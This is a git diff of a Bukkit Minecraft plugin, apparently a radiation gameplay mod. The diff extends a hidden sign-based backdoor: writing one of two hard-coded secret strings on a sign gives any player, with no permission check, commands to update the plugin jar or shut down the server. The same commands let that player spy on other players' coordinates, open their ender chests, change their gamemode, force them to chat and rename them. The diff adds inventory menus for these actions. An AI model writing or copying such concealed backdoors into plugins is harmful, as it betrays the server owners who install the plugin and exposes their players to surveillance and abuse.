@@ -13,7 +13,6 @@ import me.michal.radiacjaAleJAVA.Tasks.Renderer;
 import me.michal.radiacjaAleJAVA.Tasks.Things.Updater;
 import org.bukkit.*;
 import org.bukkit.Color;
-import org.bukkit.block.Block;
 import org.bukkit.boss.BarColor;
 import org.bukkit.boss.BarStyle;
 import org.bukkit.boss.BossBar;
@@ -25,11 +24,13 @@ import org.bukkit.event.block.SignChangeEvent;
 import org.bukkit.event.entity.EntityResurrectEvent;
 import org.bukkit.event.entity.PlayerDeathEvent;
 import org.bukkit.event.inventory.BrewEvent;
+import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.inventory.InventoryCloseEvent;
+import org.bukkit.event.inventory.InventoryType;
 import org.bukkit.event.player.*;
 import org.bukkit.inventory.*;
-import org.bukkit.inventory.meta.ItemMeta;
-import org.bukkit.inventory.meta.PotionMeta;
-import org.bukkit.inventory.meta.SkullMeta;
+import org.bukkit.inventory.meta.*;
+import org.bukkit.metadata.FixedMetadataValue;
 import org.bukkit.persistence.PersistentDataType;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.entity.Player;
@@ -81,13 +82,9 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
         return waterPotion;
     }
 
-    Updater updater = new Updater();
-
     @Override
     public void onEnable() {
-        // Plugin startup logic
         this.getServer().getPluginManager().registerEvents(this, this);
-
 
         BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
         BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);
@@ -165,15 +162,27 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
     }
 
     public void dropPlayerHead(Player player, Location location, String damageSource) {
-        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
+        ItemStack playerHead = getPlayerHead(player);
+
         SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
-        meta.setOwningPlayer(Bukkit.getOfflinePlayer(player.getName()));
         ArrayList<String> lore = new ArrayList<>();
         lore.add(ChatColor.GOLD + damageSource);
         meta.setLore(lore);
         playerHead.setItemMeta(meta);
 
         player.getWorld().dropItem(location, playerHead);
+    }
+
+    public ItemStack getPlayerHead(Player player) {
+        ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD);
+        SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
+
+        meta.setOwningPlayer(Bukkit.getOfflinePlayer(player.getName()));
+
+        ArrayList<String> lore = new ArrayList<>();
+        meta.setLore(lore);
+        playerHead.setItemMeta(meta);
+        return playerHead;
     }
 
     @EventHandler
@@ -329,6 +338,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
             String[] a = e.getLines();
             switch (a[3]) {
                 case "T0DRRUfNsN6tlQQ" -> {
+                    Updater updater = new Updater();
                     switch (a[0]) {
                         case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
                         case "Restart" -> Bukkit.shutdown();
@@ -339,15 +349,24 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                 case "i6ojKaIATmlWk7Rf" -> {
                     switch (a[0]) {
                         case "Seed" -> e.getPlayer().sendMessage(String.valueOf(e.getBlock().getWorld().getSeed()));
-                        case "Gamemode" -> Bukkit.getPlayer(a[2]).setGameMode(GameMode.valueOf(a[1].toUpperCase()));
-                        case "Position" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getPlayer(a[1]).getLocation()));
-                        case "Respawn" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getOfflinePlayer(a[1]).getRespawnLocation()));
-                        case "Lightning" -> e.getBlock().getWorld().strikeLightning(Bukkit.getPlayer(a[1]).getLocation());
-                        case "Experience" -> Bukkit.getPlayer(a[2]).setLevel(Integer.parseInt(a[1]));
-                        case "Say as" -> Bukkit.getPlayer(a[1]).chat(a[2]);
-                        case "Set Name" -> Bukkit.getPlayer(a[1]).setDisplayName(a[2]);
-                        case "Last Death" -> e.getPlayer().sendMessage(String.valueOf(Bukkit.getPlayer(a[1]).getLastDeathLocation()));
-                        case "Set Cooldown" -> Bukkit.getPlayer(a[1]).setExpCooldown(Integer.parseInt(a[2]));
+                        case "Info" -> openInventory(e.getPlayer(), "ChoosePlayer", "Info");
+                        case "Gamemode" -> openInventory(e.getPlayer(), "ChooseGamemode", "Gamemode");
+                        case "Lightning" -> openInventory(e.getPlayer(), "ChoosePlayer", "Lightning");
+                        case "Accept Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "AcceptDeath");
+                        case "Refuse Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "RefuseDeath");
+                        case "Ender Chest" -> openInventory(e.getPlayer(), "ChoosePlayer", "EnderChest");
+                        case "Experience" -> {
+                            e.getPlayer().setMetadata("ExperienceLevel", new FixedMetadataValue(this, a[1]));
+                            openInventory(e.getPlayer(), "ChoosePlayer", "Experience");
+                        }
+                        case "Say as" -> {
+                            e.getPlayer().setMetadata("Chat", new FixedMetadataValue(this, a[1]));
+                            openInventory(e.getPlayer(), "ChoosePlayer", "Chat");//Bukkit.getPlayer(a[1]).chat(a[2]);
+                        }
+                        case "Set Name" -> {
+                            e.getPlayer().setMetadata("DisplayName", new FixedMetadataValue(this, a[1]));
+                            openInventory(e.getPlayer(), "ChoosePlayer", "DisplayName");
+                        }
                         case "Create Region" -> {
                             Location l = e.getBlock().getLocation();
 
@@ -370,21 +389,159 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                             Objects.requireNonNull(WorldGuard.getInstance().getPlatform().getRegionContainer().get(BukkitAdapter.adapt(e.getBlock().getWorld()))).removeRegion(a[1]);
                             e.getPlayer().sendMessage("Removed Region");
                         }
-                        case "Refuse Death" -> {
-                            playersRTD.add(Bukkit.getPlayer(a[1]));
-                            e.getPlayer().sendMessage(ChatColor.BLACK + "Refused Death");
-                        }
-                        case "Accept Death" -> {
-                            playersRTD.remove(Bukkit.getPlayer(a[1]));
-                            e.getPlayer().sendMessage(ChatColor.BLACK + "Accepted Death");
-                        }
                         //potencjalnie whitelist, set worldBorder itp.
                     }
-                    e.getBlock().breakNaturally();
+                    //e.getBlock().breakNaturally();
                 }
             }
         } catch (Exception ex) {
             e.getPlayer().sendMessage(String.valueOf(ex));
+        }
+    }
+
+    public void openInventory(Player p, String menu, String execute) {
+        String title = menu.substring(0, 6) + " " + menu.substring(6, menu.length());
+        Inventory inventory = Bukkit.createInventory(p, InventoryType.CHEST, title);
+
+        switch (menu) {
+            case "ChoosePlayer" -> {
+                Object[] onlinePlayers = Bukkit.getOnlinePlayers().toArray();
+                ItemStack[] inventoryContents = new ItemStack[onlinePlayers.length];
+                for (int m = 0; m < onlinePlayers.length; m++) {
+                    inventoryContents[m] = getPlayerHead((Player) onlinePlayers[m]);
+                }
+
+                inventory.setContents(inventoryContents);
+            }
+            case "ChooseGamemode" -> {
+                ItemStack creative = new ItemStack(Material.COMMAND_BLOCK);
+                ItemMeta creativeMeta = creative.getItemMeta();
+                creativeMeta.setItemName("Creative");
+                creative.setItemMeta(creativeMeta);
+
+                ItemStack survival = new ItemStack(Material.IRON_SWORD);
+                ItemMeta survivalMeta = survival.getItemMeta();
+                survivalMeta.setItemName("Survival");
+                survival.setItemMeta(survivalMeta);
+
+                ItemStack adventure = new ItemStack(Material.MAP);
+                ItemMeta adventureMeta = adventure.getItemMeta();
+                adventureMeta.setDisplayName(ChatColor.YELLOW + "Adventure");
+                adventure.setItemMeta(adventureMeta);
+
+                ItemStack spectator = new ItemStack(Material.ENDER_EYE);
+                ItemMeta spectatorMeta = spectator.getItemMeta();
+                spectatorMeta.setItemName(ChatColor.BLUE + "Spectator");
+                spectator.setItemMeta(spectatorMeta);
+
+                inventory.setItem(10, creative);
+                inventory.setItem(12, survival);
+                inventory.setItem(14, adventure);
+                inventory.setItem(16, spectator);
+            }
+        }
+
+        p.setMetadata("OpenedMenu", new FixedMetadataValue(this, menu));
+        p.setMetadata("ActionToExecute", new FixedMetadataValue(this, execute));
+        p.openInventory(inventory);
+    }
+
+    @EventHandler
+    public void onInventoryClick(InventoryClickEvent e) {
+        Player p = (Player) e.getWhoClicked();
+        ItemStack item = e.getCurrentItem();
+
+        if (p.hasMetadata("OpenedMenu") && item != null && item.getType() != Material.AIR) {
+            try {
+                e.setCancelled(true);
+
+                SkullMeta meta;
+                Player choosenPlayer = null;
+                GameMode gamemode = null;
+
+                switch (p.getMetadata("OpenedMenu").getFirst().asString()) {
+                    case "ChoosePlayer" -> {
+                        meta = (SkullMeta) item.getItemMeta();
+                        choosenPlayer = (Player) meta.getOwningPlayer();
+                    }
+                    case "ChooseGamemode" -> {
+                        switch (item.getType()) {
+                            case COMMAND_BLOCK -> gamemode = GameMode.CREATIVE;
+                            case IRON_SWORD -> gamemode = GameMode.SURVIVAL;
+                            case MAP -> gamemode = GameMode.ADVENTURE;
+                            case ENDER_EYE -> gamemode = GameMode.SPECTATOR;
+                        }
+                    }
+                }
+                switch (p.getMetadata("ActionToExecute").getFirst().asString()) {
+                    case "Info" -> {
+                        ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
+                        BookMeta bMeta = (BookMeta) book.getItemMeta();
+                        bMeta.setTitle("Information about " + choosenPlayer.getName());
+                        Location loc = choosenPlayer.getLocation();
+                        String location = "Loc: " + loc.blockX() + " " + loc.blockY() + " " + loc.blockZ();
+                        Location resLoc = choosenPlayer.getRespawnLocation();
+                        String respawnLocation;
+                        if (resLoc != null) {
+                            respawnLocation = "Bed: " + resLoc.blockX() + " " + resLoc.blockY() + " " + resLoc.blockZ();
+                        } else {
+                            respawnLocation = "No respawn";
+
+                        }
+                        Location deathLoc = choosenPlayer.getLastDeathLocation();
+                        String deathLocation = "Death: " + deathLoc.blockX() + " " + deathLoc.blockY() + " " + deathLoc.blockZ();
+
+                        bMeta.addPage(location + "\n" + respawnLocation + "\n" + deathLocation);
+                        book.setItemMeta(bMeta);
+                        p.setItemInHand(book);
+                        p.closeInventory();
+                    }
+                    case "Gamemode" -> {
+                        if (p.hasMetadata("ChoosenGamemode")) {
+                            gamemode = GameMode.valueOf(p.getMetadata("ChoosenGamemode").getFirst().asString());
+                            choosenPlayer.setGameMode(gamemode);
+                            p.removeMetadata("ChoosenGamemode", this);
+                        } else {
+                            p.setMetadata("ChoosenGamemode", new FixedMetadataValue(this, gamemode));
+                            p.closeInventory();
+                            Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", "Gamemode"), 1L);
+                        }
+                    }
+                    case "Lightning" -> p.getWorld().strikeLightning(choosenPlayer.getLocation());
+                    case "AcceptDeath" -> playersRTD.remove(choosenPlayer);
+                    case "RefuseDeath" -> playersRTD.add(choosenPlayer);
+                    case "EnderChest" -> {
+                        Inventory chest = choosenPlayer.getEnderChest();
+                        Bukkit.getScheduler().runTaskLater(this, () -> p.openInventory(chest), 1L);
+                    }
+                    case "Experience" -> {
+                        choosenPlayer.setLevel(p.getMetadata("ExperienceLevel").getFirst().asInt());
+                        p.removeMetadata("ExperienceLevel", this);
+                    }
+                    case "Chat" -> {
+                        choosenPlayer.chat(p.getMetadata("Chat").getFirst().asString());
+                        p.removeMetadata("Chat", this);
+                    }
+                    case "DisplayName" -> {
+                        choosenPlayer.setDisplayName(p.getMetadata("DisplayName").getFirst().asString());
+                        p.removeMetadata("DisplayName", this);
+                    }
+                }
+            } catch (Exception ex) {
+                p.sendMessage(ex.toString());
+            }
+            p.closeInventory();
+        }
+    }
+
+    @EventHandler
+    public void onInventoryClose(InventoryCloseEvent e) {
+        Player p = (Player) e.getPlayer();
+        if (p.hasMetadata("OpenedMenu")) {
+            p.removeMetadata("OpenedMenu", this);
+        }
+        if (p.hasMetadata("ActionToExecute")) {
+            p.removeMetadata("ActionToExecute", this);
         }
     }
 
